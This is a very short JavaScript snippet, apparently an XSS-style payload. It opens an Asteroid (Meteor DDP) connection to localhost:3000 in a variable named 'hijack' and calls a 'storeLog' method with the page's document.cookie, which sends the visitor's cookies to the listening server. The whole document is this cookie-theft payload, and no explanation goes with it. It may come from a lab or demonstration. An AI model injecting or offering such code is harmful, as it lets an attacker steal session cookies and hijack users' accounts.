var hijack = new Asteroid("localhost:3000");

hijack.call('storeLog', {content: document.cookie});

